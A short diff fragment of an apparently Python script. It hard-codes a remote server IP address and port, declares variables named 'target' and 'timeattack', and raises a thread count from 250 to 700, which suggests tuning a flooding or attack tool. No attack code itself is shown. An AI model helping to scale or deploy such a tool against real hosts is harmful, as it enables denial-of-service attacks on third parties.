@@ -6,7 +6,7 @@ import os
 import multiprocessing
 host_server = "217.154.161.167"
 host_port = 11951
-thread77 = 250
+thread77 = 700
 redhot = None
 timeattack = None
 target = None
